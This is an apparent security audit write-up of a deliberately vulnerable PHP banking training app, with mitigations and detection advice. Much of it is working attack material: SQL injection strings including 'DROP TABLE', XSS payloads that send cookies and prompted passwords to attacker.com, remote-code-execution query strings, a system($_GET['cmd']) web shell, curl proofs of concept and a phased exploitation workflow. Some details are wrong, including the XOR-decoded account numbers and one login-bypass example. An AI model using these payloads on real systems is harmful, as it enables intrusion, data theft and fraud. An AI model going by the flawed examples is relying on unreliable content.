# vBank Application Security Analysis & Attack Vectors

**Author**: Security Audit Team  
**Date**: 2026-06-04  
**Application**: Sphinx vBank (Vulnerable Banking Application)  
**Tested Version**: PHP 5.6 / MySQL 5.5  

---

## Table of Contents
1. [SQL Injection](#sql-injection)
2. [Cross-Site Scripting (XSS)](#cross-site-scripting)
3. [Authentication Bypass via Client-Side Manipulation](#authentication-bypass)
4. [Request Manipulation & Parameter Tampering](#request-manipulation)
5. [Local File Inclusion](#local-file-inclusion)
6. [Stored XSS via Remark Fields](#stored-xss-transfers)
7. [Account Number Enumeration](#account-enumeration)
8. [Summary & Impact](#summary)

---

## SQL Injection

### Description
SQL Injection (CWE-89, OWASP A03:2021 Injection) is a code injection vulnerability that allows attackers to manipulate SQL queries at runtime. The vBank application directly concatenates user input into SQL queries without proper sanitization or parameterized statements.

### CVSS Score: 9.8 (Critical)

### Vulnerable Code Locations

#### 1. **Authentication Bypass in login.php** (Lines 16-18)
```php
$username = $_REQUEST['username'];
$password = $_REQUEST['password'];
$sql = "SELECT * FROM " . $htbconf['db/users'] . " where " . 
       $htbconf['db/users.username'] . "='$username' and " . 
       $htbconf['db/users.password'] . "='$password'";
```

**Vulnerability**: Username and password parameters are directly injected into the SQL query without any escaping or prepared statements.

**Attack Vector**:
```
Username: ' OR '1'='1
Password: ' OR '1'='1
```

Resulting SQL Query:
```sql
SELECT * FROM users where username='' OR '1'='1' and password='' OR '1'='1'
```

**Impact**:
- Bypass login authentication without knowing valid credentials
- Access any user account (will return first user in table, typically admin)
- Gain unauthorized access to the banking system

**Exploitation Steps**:
1. Navigate to login page (http://localhost/)
2. Enter in Username field: `' OR '1'='1`
3. Enter in Password field: `' OR '1'='1`
4. Click login
5. First user record will authenticate (typically user ID 1, 'alex')

**Proof of Concept - cURL**:
```bash
curl -G "http://localhost/login.php" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=' OR '1'='1"
```

---

#### 2. **SQL Injection in Transfer Remark Field** (htbtransfer.page, Line 39)
```php
$sql="insert into ".$htbconf['db/transfers']." (...) values(..., '".$http['remark']."', ...)";
```

**Vulnerability**: The remark parameter is concatenated directly into the INSERT statement.

**Attack Vector**:
```
Remark: ', (SELECT password FROM users LIMIT 1), '
```

**Possible Attack**:
```php
Remark: '); DROP TABLE accounts; --
Remark: ', NOW()); INSERT INTO users VALUES (99, 'admin123', 'hacker', 'Hacker', 'Evil', --
```

**Impact**:
- Extract sensitive data (passwords, account numbers, balances)
- Modify transfer records
- Create unauthorized user accounts
- Potential database corruption or destruction

**Exploitation Steps**:
1. Log in with valid credentials (user: alex / pass: 413Xp455)
2. Navigate to Transfer Funds page
3. Fill in source account, destination, and amount
4. In "Remark" field, enter: `', (SELECT CONCAT(username,':',password) FROM users LIMIT 1)), '`
5. Submit transfer
6. Check database - the remark field will contain username:password

**Proof of Concept**:
```bash
# After logging in with alex credentials
curl "http://localhost/index.php?page=htbtransfer" \
  --cookie "USECURITYID=<session_id>" \
  -G \
  --data-urlencode "srcacc=<xored_account>" \
  --data-urlencode "dstbank=41131337" \
  --data-urlencode "dstacc=22222222" \
  --data-urlencode "amount=10" \
  --data-urlencode "remark=', (SELECT password FROM users LIMIT 1), '" \
  --data-urlencode "htbtransfer=Transfer"
```

---

#### 3. **SQL Injection in Loan Amount Parameter** (htbloanconf.page, Line 24)
```php
$sql="update ".$htbconf['db/accounts']." set ".$htbconf['db/accounts.curbal'].
     "=".$htbconf['db/accounts.curbal']." + \"".($http['loan'])."\", ...";
```

**Vulnerability**: The loan amount is directly concatenated without type checking.

**Attack Vector**:
```
Loan Amount: 1000 + (SELECT MAX(curbal) FROM accounts)
Loan Amount: 1000); UPDATE accounts SET curbal=999999 WHERE account=11111111; --
```

**Impact**:
- Modify account balances arbitrarily
- Update other users' account information
- Potentially empty other accounts and deposit into attacker's account

---

### Mitigation (What SHOULD be done - NOT done in this app)
```php
// Correct approach using prepared statements
$stmt = $link->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

---

## Cross-Site Scripting (XSS)

### Description
Cross-Site Scripting (CWE-79, OWASP A03:2021 Injection) allows attackers to inject malicious scripts that execute in users' browsers. The vBank application displays user-controlled data without proper HTML escaping or output encoding.

### CVSS Score: 7.5 (High)

### Vulnerability Types in vBank

#### 1. **Stored XSS via Remark Field** (htbdetails.page, Line 45)
```php
$transfersStr .= "<td>".$row[5]."</td>\n";  // $row[5] is remark
print $transfersStr;
```

**Vulnerability**: Transfer remarks are stored in database and displayed without escaping, creating Stored XSS.

**Attack Vector - JavaScript Injection**:
```
Remark: <img src=x onerror="alert('XSS Vulnerability')">
Remark: <script>alert('Session ID: ' + document.cookie)</script>
```

**Attack Vector - Cookie Stealing**:
```
Remark: <img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```

**Attack Vector - Session Hijacking Setup**:
```
Remark: <img src=x onerror="new Image().src='http://attacker.com/log?sid='+encodeURIComponent(document.cookie)">
```

**Impact**:
- Steal session cookies and authenticate as victim
- Capture login credentials via fake forms
- Redirect to phishing sites
- Modify page content (balance manipulation display)
- Perform actions on behalf of the victim

**Exploitation Steps**:
1. Log in as 'alex' (password: 413Xp455)
2. Navigate to Transfer Funds
3. Fill source account, destination bank, account, amount
4. In Remark field, enter: `<img src=x onerror="alert('XSS - ' + document.cookie)">`
5. Click Transfer
6. Navigate to Account Details for a transfer containing XSS
7. Alert popup appears showing session cookie

**Persistent Attack Scenario**:
An attacker transfers $0.01 with XSS payload in remark. Every user viewing their account details will be affected.

---

#### 2. **Reflected XSS in htbdetails.page via Query Parameter** (Lines 56-60)
```php
if(isset($http['query']) && $http['query'] != "") {
    $replaceWith = "preg_replace('#\b". str_replace('\\', '\\\\', $http['query']) ."\b#i', 
                   '<span class=\"queryHighlight\">\\\\0</span>','\\0')";
    $transfersStr = preg_replace('#(\>((?>(([^><]+|(?R))))*\<))#se',$replaceWith,'>'.$transfersStr.'<');
}
```

**Critical Issue**: Use of `/e` modifier in preg_replace (deprecated and dangerous) + user-controlled input in replacement string.

**Attack Vector - Code Execution**:
```
query: " . system('id') . "
query: " . phpinfo() . "
query: " . file_get_contents('/etc/passwd') . "
```

**Attack Vector - RCE via PHP Code**:
```
query: ";}system('whoami');//
query: ";}system($_GET['cmd']);//
```

**This is actually a Remote Code Execution vulnerability**, more severe than XSS!

**Impact**:
- Execute arbitrary PHP code on the server
- Read/modify/delete files on the system
- Access database credentials and contents
- Create backdoors for persistent access
- Execute system commands

**Exploitation Steps**:
1. Log in as alex
2. Perform a transfer to generate transfer records
3. Navigate to Account Details with malicious query parameter:
```
http://localhost/index.php?page=htbdetails&account=<xored_account>&query=" . system('whoami') . "
```
4. PHP code executes on server

**Proof of Concept - Command Execution**:
```bash
curl "http://localhost/index.php?page=htbdetails&account=<xored>&query=%22%20.%20system%28%27id%27%29%20.%20%22"
```

---

#### 3. **Error Message Reflection** (Multiple pages)
Session error/warning messages are echoed without HTML encoding:
```php
$_SESSION['error'] = "<p>Your password or username is wrong!</p>";
// Later echoed as: echo $_SESSION['error'];
```

If attacker can control session messages through parameter manipulation, XSS is possible.

---

### Mitigation (What SHOULD be done)
```php
// Correct approach with HTML escaping
echo "<td>" . htmlspecialchars($row[5], ENT_QUOTES, 'UTF-8') . "</td>";

// Never use /e modifier with user input
$transfersStr = preg_replace('#(\>((?>(([^><]+|(?R))))*\<))#s', $replaceWith, '>'.$transfersStr.'<');

// Use htmlentities() for output
print htmlentities($transfersStr, ENT_QUOTES, 'UTF-8');
```

---

## Authentication Bypass

### Description
This attack exploits weak client-side validation and lack of server-side verification to bypass authentication controls.

### CVSS Score: 8.6 (High)

### Vulnerability Details

#### 1. **Client-Side Only Password Validation** (htb.js, lines 1-18)
```javascript
function checkform() {
    var password = loginform.password.value;
    if (password.match("[^a-zA-Z0-9]")) {
        alert('Error: The password only allows letters and numbers...');
        return false;
    }
}
```

**Vulnerability**: 
- Validation only happens in JavaScript on client browser
- Can be easily bypassed by disabling JS or intercepting request
- No server-side validation of input format

**Attack Vector**:
1. Disable JavaScript in browser
2. Submit login form with special characters
3. Bypass client-side validation

**Or using command line**:
```bash
curl "http://localhost/login.php" \
  --data-urlencode "username=alex" \
  --data-urlencode "password=413@Xp@ss#"
```

**The server doesn't validate**, allowing any password format.

---

#### 2. **Plain Text Password Storage**
Database stores passwords in plain text:
```sql
INSERT INTO users VALUES (1, '413Xp455', 'alex', 'Lexo', 'Alex', ...);
```

**Attack Vector**:
If database is breached (via SQL injection or access control issues), all user passwords are immediately compromised.

**Impact**:
- No protection even if database is accessed
- Passwords visible to database administrators
- No cost to password cracking

---

#### 3. **Direct SQL Injection for Authentication Bypass** (Covered above)
Attackers can bypass login with:
```
Username: ' OR '1'='1
Password: anything
```

---

## Request Manipulation & Parameter Tampering

### Description
OWASP A04:2021 - Insecure Design / CWE-20 (Improper Input Validation)

Users can manipulate HTTP request parameters to perform unauthorized actions.

### CVSS Score: 8.2 (High)

### Vulnerability Details

#### 1. **Hidden Form Field Manipulation in Loan Requests** (htbloanconf.page)
```html
<input type="hidden" name="creditacc" value="<?php print $http['creditacc']; ?>">
<input type="hidden" name="debitacc" value="<?php print $http['debitacc']; ?>">
<input type="hidden" name="loan" value="<?php print $http['loan']; ?>">
<input type="hidden" name="interest" value="...">
```

**Vulnerability**: 
- Hidden fields can be modified by client/proxy before submission
- No server-side verification that values haven't changed
- No CSRF tokens to prevent tampering

**Attack Vector**:
1. User requests loan amount: 1000
2. Attacker intercepts request (Burp Suite / Proxy)
3. Change `loan=1000` to `loan=100000`
4. Forward modified request
5. Server processes and grants $100,000 loan without verification

**Exploitation Steps**:
1. Log in as alex
2. Navigate to Request Loan → Loan Confirmation page
3. Use HTTP Proxy (Burp Suite, Fiddler, ZAP):
   - Intercept the POST request to htbloanconf
   - Change `loan=1000` to `loan=999999`
   - Release request
4. Attacker receives massive loan amount

**Proof of Concept**:
```bash
# Original request would have:
loan=1000&interest=4.2&period=1&creditacc=<xored>&debitacc=<xored>

# Modified to:
loan=999999&interest=0.1&period=1&creditacc=<xored>&debitacc=<xored>

curl -X POST "http://localhost/index.php?page=htbloanconf" \
  --cookie "USECURITYID=<session_id>" \
  --data "loan=999999&interest=4.2&period=1&creditacc=<xored>&debitacc=<xored>&submit=Confirm"
```

---

#### 2. **Transfer Amount Manipulation** (htbtransfer.page)
```php
if(!isset($http['amount']) || $http['amount'] == "" || !is_numeric($http['amount'])) {
    // Check passes if numeric
}
// But then directly used in SQL without further validation
```

**Vulnerability**:
- Amount is validated as numeric but not range-checked
- Can transfer negative amounts (credit own account)
- Can transfer fractional amounts leading to rounding exploits

**Attack Vector**:
```
source_account=11111111 (balance: 1000)
destination_account=22222222
amount=-500  // Transfers -500, crediting source account +500
```

Result: Account 11111111 goes from 1000 to 1500, account 22222222 from 222 to -278

**Exploitation**:
```bash
curl "http://localhost/index.php?page=htbtransfer" \
  --data-urlencode "srcacc=<xored>" \
  --data-urlencode "dstbank=41131337" \
  --data-urlencode "dstacc=22222222" \
  --data-urlencode "amount=-1000" \
  --data-urlencode "remark=Exploit" \
  --data-urlencode "htbtransfer=Transfer"
```

---

#### 3. **No CSRF Protection**
No CSRF tokens in forms. An attacker can craft a link:
```html
<img src="http://vbank.local/index.php?page=htbtransfer&srcacc=123&dstbank=41131337&dstacc=999&amount=500&remark=Stolen&htbtransfer=Transfer">
```

If victim is logged in and visits this page, transfer executes automatically.

---

## Local File Inclusion

### Description
CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

The application dynamically loads pages without proper validation.

### CVSS Score: 5.3 (Medium)

### Vulnerable Code Location (htb.inc, htb_load_page function)
```php
function htb_load_page($page) {
    global $http;
    $pagepath = htb_get_path('pages');
    if (!file_exists($pagepath . $page . '.page')) {
        $_SESSION['error'] = 'Invalid page! Please contact your administrator!';
        htb_redirect(htb_getbaseurl());
    }
    include_once($pagepath . $page . '.page');
}
```

**Call in index.php** (index.php, implicit through main page loading):
```php
$http['page'] = 'htbmain';  // User can control this via GET parameter
// Later: include page based on $http['page']
```

**Vulnerability**:
- Only checks if `.page` file exists
- Doesn't prevent directory traversal with `../`
- Attacker could potentially read other files

**Attack Vector**:
```
Payload: page=../etc/config.php
Attempted file: /var/www/vBank/pages/../etc/config.php = /var/www/vBank/etc/config.php
```

However, `.page` extension is appended, so pure path traversal to arbitrary files is limited. But combined with other vulnerabilities (SQL injection to write files), could be severe.

**Attack Scenario with File Write via SQL**:
1. Use SQL injection to write PHP code to a writable directory
2. Include that PHP file via LFI
3. Execute arbitrary code

**Possible Exploitation**:
```bash
# Create a file via SQL injection:
curl "http://localhost/index.php?page=htbtransfer" \
  --data-urlencode "remark=<?php system(\$_GET['cmd']); ?>" \
  ...
  
# Then if we can write to a .page file:
curl "http://localhost/index.php?page=../../../tmp/shell"
```

**Impact**: Limited without other vulnerabilities, but increases overall risk surface.

---

## Stored XSS via Transfer Remarks - Advanced Scenarios

### Description
The persistent nature of XSS in the remark field creates long-lasting attack vectors.

### CVSS Score: 7.2 (High - Stored XSS)

### Attack Scenarios

#### 1. **Session Hijacking Attack**
**Payload**:
```html
<img src=x onerror="fetch('http://attacker.com/steal.php?session='+document.cookie)">
```

**Process**:
1. Attacker transfers money with XSS payload in remark
2. Victim logs in and views transfer history
3. Victim's session cookie is sent to attacker's server
4. Attacker uses stolen session to log in as victim

---

#### 2. **Fake Balance Display**
**Payload**:
```html
<script>
document.addEventListener('DOMContentLoaded', function() {
    var balances = document.querySelectorAll('td');
    balances.forEach(function(el) {
        if(el.textContent.includes('1000')) {
            el.textContent = '999999.00';
        }
    });
});
</script>
```

**Impact**: Victim sees inflated balance in their browser (psychological impact)

---

#### 3. **Credential Harvesting**
**Payload**:
```html
<script>
if(!localStorage.getItem('harvested')) {
    var password = prompt('Session expired. Please enter your password to continue:');
    fetch('http://attacker.com/harvest.php', {
        method: 'POST',
        body: 'pass=' + password + '&user=' + '<?php echo $_SESSION["user"]; ?>'
    });
    localStorage.setItem('harvested', '1');
}
</script>
```

**Impact**: Victims unknowingly submit credentials to attacker

---

## Account Number Enumeration

### Description
The XOR "encryption" of account numbers is trivial to break, allowing attackers to discover all accounts.

### CVSS Score: 3.7 (Low but informational)

### Vulnerability Details

**XOR Value**: `0x0BADC0DE` (defined in config.php)

**Formula**: 
```
XORed Account = Original Account XOR 0x0BADC0DE
```

**Since XOR is reversible**:
```
Original Account = XORed Account XOR 0x0BADC0DE
```

**Known Accounts**:
- Account 11111111 XOR 0x0BADC0DE = 252170513
- Account 22222222 XOR 0x0BADC0DE = 243688756
- Account 33333333 XOR 0x0BADC0DE = 235207009

**Exploitation**:
1. Attacker logs in
2. Observes XORed account numbers in URL
3. Decodes them locally: `account_number XOR 0x0BADC0DE`
4. Discovers all account numbers in the system
5. Uses this to enumerate and target specific accounts

**Python PoC**:
```python
xor_value = 0x0BADC0DE
xored_account = 252170513
original = xored_account ^ xor_value
print(f"Account: {original}")  # Output: 11111111
```

---

## Attack Matrix Summary

| Attack Type | Severity | CVSS | Exploitability | Authentication Required |
|-------------|----------|------|-----------------|------------------------|
| SQL Injection (Login) | Critical | 9.8 | Very Easy | No |
| SQL Injection (Transfers) | Critical | 9.8 | Easy | Yes |
| RCE via Regex /e Modifier | Critical | 9.9 | Medium | Yes |
| Stored XSS | High | 7.5 | Easy | Yes |
| Session Hijacking | High | 8.2 | Easy | Yes |
| Loan Amount Tampering | High | 8.2 | Easy | Yes |
| Transfer Amount Manipulation | High | 8.2 | Easy | Yes |
| Client-Side Auth Bypass | High | 8.6 | Very Easy | No |
| Plain Text Passwords | High | 7.1 | Easy (DB Access) | - |
| CSRF | High | 8.0 | Easy | Yes |
| LFI | Medium | 5.3 | Medium | Yes |
| Account Enumeration | Low | 3.7 | Very Easy | No |

---

## Common Exploitation Workflow

### Phase 1: Initial Access
```bash
# Step 1: SQL Injection Login Bypass
curl -G "http://localhost/login.php" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=anything"
# Obtains session cookie as user 'alex'
```

### Phase 2: Data Exfiltration
```bash
# Step 2: Extract all user passwords via SQL Injection
curl "http://localhost/index.php?page=htbtransfer" \
  --cookie "USECURITYID=<session_id>" \
  -G \
  --data-urlencode "remark=Test' UNION SELECT password,username,1,2,3,4,5,6 FROM users--" \
  ...
# Passwords appear in transfer remarks
```

### Phase 3: Privilege Escalation / Lateral Movement
```bash
# Step 3: Extract admin credentials from database
# Use SQL injection to read config file or find admin account
# Could create new admin user via SQL injection
```

### Phase 4: Persistence
```bash
# Step 4: Establish persistent access
# Inject PHP backdoor via SQL UNION SELECT INTO OUTFILE
# Or exploit /e modifier to write web shell
```

---

## Detection Methods

### Log-Based Detection
```
# Look for in Apache/application logs:
- Multiple failed login attempts followed by successful access
- Requests with SQL keywords in parameters (OR, UNION, SELECT, INJECT)
- Unusual characters in usernames/passwords (' " ; --)
- Requests with HTML/JavaScript in parameters
- Access to ../../../ patterns
```

### Database Monitoring
```sql
-- Query to detect suspicious transfers
SELECT * FROM transfers 
WHERE remark LIKE '%<script%' 
   OR remark LIKE '%onerror%'
   OR amount < 0;
```

### Web Application Firewall (WAF)
- Block requests containing SQL keywords in GET/POST parameters
- Block requests with HTML/JavaScript entities
- Implement rate limiting on login attempts
- Require CSRF tokens

---

## References

### CWE (Common Weakness Enumeration)
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- CWE-434: Unrestricted Upload of File with Dangerous Type
- CWE-798: Use of Hard-Coded Credentials

### OWASP TOP 10 (2021)
- A03:2021 – Injection
- A04:2021 – Insecure Design
- A05:2021 – Security Misconfiguration
- A07:2021 – Identification and Authentication Failures
- A08:2021 – Software and Data Integrity Failures

### OWASP Resources
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

### PHP Security
- PHP Prepared Statements: https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php
- PHP htmlspecialchars: https://www.php.net/manual/en/function.htmlspecialchars.php
- Deprecated preg_replace /e modifier: https://www.php.net/manual/en/function.preg-replace.php

---

## Remediation Guidance (NOT IMPLEMENTED IN VULNERABLE VERSION)

### Critical Fixes Required:
1. **Use Prepared Statements** for all database queries
2. **Output Encoding** with htmlspecialchars() or htmlentities()
3. **Input Validation** with server-side checks
4. **Password Hashing** with bcrypt or argon2
5. **CSRF Tokens** in all forms
6. **Principle of Least Privilege** for database users
7. **Content Security Policy** headers
8. **Remove /e modifier usage** in regular expressions

---

## Disclaimer

This document is for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal. All testing must be conducted in controlled environments with proper authorization and documentation.

